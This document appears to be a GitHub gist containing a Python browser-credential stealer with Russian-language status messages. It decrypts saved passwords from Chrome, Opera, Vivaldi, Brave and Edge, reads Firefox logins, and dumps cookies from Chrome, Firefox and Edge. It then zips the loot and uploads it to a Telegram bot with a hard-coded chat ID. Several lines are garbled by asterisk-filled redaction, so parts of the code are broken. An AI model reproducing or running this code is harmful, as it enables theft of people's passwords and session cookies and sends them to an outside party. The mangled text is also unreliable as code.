#date: 2025-02-04T17:10:15Z
#url: https://api.github.com/gists/7c667ecc66eab7090ece295b228dffcb
#owner: https://api.github.com/users/moonsinnn

import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from Crypto.Cipher import AES as AES2
import requests
import zipfile

output_folder = "browser_data"
zip_file = "browser_data.zip"

if not os.path.exists(output_folder):
    os.makedirs(output_folder)

def zip_browser_data():
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(output_folder):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), output_folder))

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key_chrome():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

 "**********"d "**********"e "**********"f "**********"  "**********"d "**********"e "**********"c "**********"r "**********"y "**********"p "**********"t "**********"_ "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"_ "**********"c "**********"h "**********"r "**********"o "**********"m "**********"e "**********"( "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********", "**********"  "**********"k "**********"e "**********"y "**********") "**********": "**********"
    try:
        iv = password[3: "**********"
        password = password[15: "**********"
        cipher = AES2.new(key, AES2.MODE_GCM, iv)
        return cipher.decrypt(password)[: "**********"
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

 "**********"d "**********"e "**********"f "**********"  "**********"e "**********"x "**********"t "**********"r "**********"a "**********"c "**********"t "**********"_ "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"s "**********"_ "**********"f "**********"r "**********"o "**********"m "**********"_ "**********"b "**********"r "**********"o "**********"w "**********"s "**********"e "**********"r "**********"( "**********"d "**********"b "**********"_ "**********"p "**********"a "**********"t "**********"h "**********", "**********"  "**********"k "**********"e "**********"y "**********", "**********"  "**********"b "**********"r "**********"o "**********"w "**********"s "**********"e "**********"r "**********"_ "**********"n "**********"a "**********"m "**********"e "**********", "**********"  "**********"f "**********") "**********": "**********"
    temp_db_file = "temp_browser_data.db"
    shutil.copyfile(db_path, temp_db_file)

    db = sqlite3.connect(temp_db_file)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        password = "**********"
        date_created = row[3]
        date_last_used = row[4]

 "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"i "**********"f "**********"  "**********"u "**********"s "**********"e "**********"r "**********"n "**********"a "**********"m "**********"e "**********"  "**********"o "**********"r "**********"  "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********": "**********"
            f.write(f"Browser: {browser_name}\n")
            f.write(f"Origin URL: {origin_url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: "**********"
        if date_created != 86400000000 and date_created:
            f.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            f.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
        f.write("=" * 50 + "\n")

    cursor.close()
    db.close()
    os.remove(temp_db_file)

 "**********"d "**********"e "**********"f "**********"  "**********"e "**********"x "**********"t "**********"r "**********"a "**********"c "**********"t "**********"_ "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"s "**********"_ "**********"f "**********"i "**********"r "**********"e "**********"f "**********"o "**********"x "**********"( "**********"f "**********", "**********"  "**********"f "**********"i "**********"r "**********"e "**********"f "**********"o "**********"x "**********"_ "**********"d "**********"b "**********"_ "**********"p "**********"a "**********"t "**********"h "**********") "**********": "**********"
    profile_dirs = os.listdir(firefox_db_path)
    for profile in profile_dirs:
        firefox_db_file = os.path.join(firefox_db_path, profile, "logins.json")
        if os.path.exists(firefox_db_file):
            with open(firefox_db_file, "r", encoding="utf-8") as ffp:
                data = json.load(ffp)
                for login in data["logins"]:
                    hostname = login.get('hostname', 'Unknown')
                    username = login.get('username', 'Unknown')
                    password = "**********"

 "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"i "**********"f "**********"  "**********"u "**********"s "**********"e "**********"r "**********"n "**********"a "**********"m "**********"e "**********"  "**********"! "**********"= "**********"  "**********"" "**********"U "**********"n "**********"k "**********"n "**********"o "**********"w "**********"n "**********"" "**********"  "**********"a "**********"n "**********"d "**********"  "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"  "**********"! "**********"= "**********"  "**********"" "**********"N "**********"o "**********"  "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"" "**********": "**********"
                        f.write(f"Browser: Firefox\n")
                        f.write(f"Origin URL: {hostname}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: "**********"
                        f.write("=" * 50 + "\n")
                    else:
                        f.write(f"Browser: Firefox\n")
                        f.write(f"Origin URL: {hostname}\n")
                        f.write(f"Username: {username} (encrypted)\n")
                        f.write(f"Password: "**********"
                        f.write("=" * 50 + "\n")

def get_chrome_cookies():
    cookie_file = os.path.join(os.getenv('APPDATA'), r"Google\Chrome\User Data\Default\Cookies")
    if not os.path.exists(cookie_file):
        print("Файл cookie для Chrome не найден!")
        return

    temp_cookie_file = "temp_cookies"
    shutil.copyfile(cookie_file, temp_cookie_file)

    conn = sqlite3.connect(temp_cookie_file)
    cursor = conn.cursor()

    cursor.execute("SELECT name, value FROM cookies")
    cookies = cursor.fetchall()

    with open(os.path.join(output_folder, "chrome_cookies.txt"), "w") as f:
        for cookie in cookies:
            f.write(f"Chrome - {cookie[0]}: {cookie[1]}\n")

    conn.close()
    os.remove(temp_cookie_file)

def get_firefox_cookies():
    cookie_file = os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles")
    if not os.path.exists(cookie_file):
        print("Файл cookie для Firefox не найден!")
        return

    profile_path = None
    for folder in os.listdir(cookie_file):
        if folder.endswith(".default-release"):
            profile_path = os.path.join(cookie_file, folder)
            break

    if not profile_path:
        print("Не найден профиль Firefox!")
        return

    cookie_db_path = os.path.join(profile_path, "cookies.sqlite")
    if not os.path.exists(cookie_db_path):
        print("Файл cookies.sqlite не найден!")
        return

    temp_cookie_file = "temp_firefox_cookies.sqlite"
    shutil.copyfile(cookie_db_path, temp_cookie_file)

    conn = sqlite3.connect(temp_cookie_file)
    cursor = conn.cursor()

    cursor.execute("SELECT name, value FROM moz_cookies")
    cookies = cursor.fetchall()

    with open(os.path.join(output_folder, "firefox_cookies.txt"), "w") as f:
        for cookie in cookies:
            f.write(f"Firefox - {cookie[0]}: {cookie[1]}\n")

    conn.close()
    os.remove(temp_cookie_file)

def get_edge_cookies():
    cookie_file = os.path.join(os.getenv('APPDATA'), r"Microsoft\Edge\User Data\Default\Cookies")
    if not os.path.exists(cookie_file):
        print("Файл cookie для Microsoft Edge не найден!")
        return

    temp_cookie_file = "temp_edge_cookies"
    shutil.copyfile(cookie_file, temp_cookie_file)

    conn = sqlite3.connect(temp_cookie_file)
    cursor = conn.cursor()

    cursor.execute("SELECT name, value FROM cookies")
    cookies = cursor.fetchall()

    with open(os.path.join(output_folder, "edge_cookies.txt"), "w") as f:
        for cookie in cookies:
            f.write(f"Edge - {cookie[0]}: {cookie[1]}\n")

    conn.close()
    os.remove(temp_cookie_file)

def get_all_cookies():
    print("Получаем cookies из Chrome...")
    get_chrome_cookies()

    print("\nПолучаем cookies из Firefox...")
    get_firefox_cookies()

    print("\nПолучаем cookies из Microsoft Edge...")
    get_edge_cookies()

def send_message_to_telegram(message):
    chat_id = "4788882634"
    bot_token = "7922970886: "**********"
    url = f"https: "**********"

    payload = {
        'chat_id': chat_id,
        'text': message
    }

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        print("Сообщение отправлено!")
    except requests.exceptions.RequestException as e:
        print(f"Ошибка при отправке сообщения: {e}")
        print(f"Ответ от сервера: {response.text if 'response' in locals() else 'No response'}")

def send_file_to_telegram():

    chat_id = "{your_chat_id}"

    bot_token = "**********"
    url = f"https: "**********"

    with open(zip_file, 'rb') as file:
        payload = {
            'chat_id': chat_id
        }
        files = {
            'document': file
        }
        try:
            response = requests.post(url, data=payload, files=files)
            response.raise_for_status()
            print("Файл успешно отправлен в Telegram!")
        except requests.exceptions.RequestException as e:
            print(f"Ошибка при отправке файла: {e}")
            print(f"Ответ от сервера: {response.text if 'response' in locals() else 'No response'}")

def main():
 "**********"  "**********"  "**********"  "**********"  "**********"w "**********"i "**********"t "**********"h "**********"  "**********"o "**********"p "**********"e "**********"n "**********"( "**********"o "**********"s "**********". "**********"p "**********"a "**********"t "**********"h "**********". "**********"j "**********"o "**********"i "**********"n "**********"( "**********"o "**********"u "**********"t "**********"p "**********"u "**********"t "**********"_ "**********"f "**********"o "**********"l "**********"d "**********"e "**********"r "**********", "**********"  "**********"" "**********"b "**********"r "**********"o "**********"w "**********"s "**********"e "**********"r "**********"s "**********"_ "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"s "**********". "**********"t "**********"x "**********"t "**********"" "**********") "**********", "**********"  "**********"" "**********"w "**********"" "**********", "**********"  "**********"e "**********"n "**********"c "**********"o "**********"d "**********"i "**********"n "**********"g "**********"= "**********"" "**********"u "**********"t "**********"f "**********"- "**********"8 "**********"" "**********") "**********"  "**********"a "**********"s "**********"  "**********"f "**********": "**********"
        browsers = [
            ("Chrome", os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")),
            ("Opera", os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")),
            ("Vivaldi", os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data", "Default", "Login Data")),
            ("Brave", os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")),
            ("Edge", os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")),
        ]

        firefox_db_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")

        for browser_name, db_path in browsers:
            if os.path.exists(db_path):
                if browser_name == "Chrome" or browser_name == "Opera" or browser_name == "Vivaldi" or browser_name == "Brave" or browser_name == "Edge":
                    key = get_encryption_key_chrome()
                    extract_passwords_from_browser(db_path, key, browser_name, f)
                else:
                    continue

        extract_passwords_firefox(f, firefox_db_path)

    get_all_cookies()

    zip_browser_data()

    send_message_to_telegram("Пароли и cookies собраны и архивированы.")
    send_file_to_telegram()

if __name__ == "__main__":
    main()
